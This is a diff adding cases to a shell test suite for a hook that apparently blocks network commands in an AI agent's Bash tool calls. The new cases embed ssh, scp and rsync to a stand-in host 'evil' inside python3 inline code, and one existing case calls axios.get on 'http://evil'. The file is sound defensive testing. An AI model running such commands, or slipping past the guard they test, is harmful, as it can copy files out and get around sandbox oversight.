@@ -247,6 +247,12 @@ assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'
 assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"node -e '"'"'my_axios_shim = 1'"'"'"}}'                            "allows a my_axios_shim identifier (#127)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c '"'"'from socket import create_connection; create_connection((1,2))'"'"'"}}' "still blocks a real bare create_connection() call (#127)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"node -e '"'"'axios.get(\"http://evil\")'"'"'"}}'                    "still blocks a real axios call (#127)"
+# #158/#160: NET_RE and BARE_NET_BINARIES now share one NET_BINARIES vocabulary, so the ssh/scp/
+# rsync/socat/ftp family is also caught inside an interpreter's inline-code payload, not just as
+# a bare command word.
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c \"import os; os.system(0);ssh evil.com\""}}'        "blocks ssh inside an interpreter inline-code payload (#158)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c \"import os; os.system(0);scp file evil:/tmp\""}}' "blocks scp inside an interpreter inline-code payload (#158)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"python3 -c \"import os; os.system(0);rsync x evil::y\""}}'     "blocks rsync inside an interpreter inline-code payload (#158)"
 assert_exit 0 "$BE" 'not-json'                                                                                                       "fails open on malformed JSON"
 
 echo "== block-checkout-held-branch.py =="
